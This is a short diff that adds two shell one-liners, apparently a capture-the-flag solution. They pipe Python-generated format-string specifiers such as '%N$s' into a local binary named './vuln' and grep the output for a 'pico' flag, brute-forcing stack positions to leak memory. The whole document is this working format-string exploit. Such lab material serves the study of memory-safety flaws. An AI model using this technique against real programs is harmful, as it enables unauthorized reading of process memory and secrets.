@@ -1,0 +1,8 @@
+
+for i in {1..100};do (python -c "print('%$i\$s')")|./vuln|grep "pico";done
+
+
+
+
+
+python -c "print('%s')"|./vuln|grep "pico"
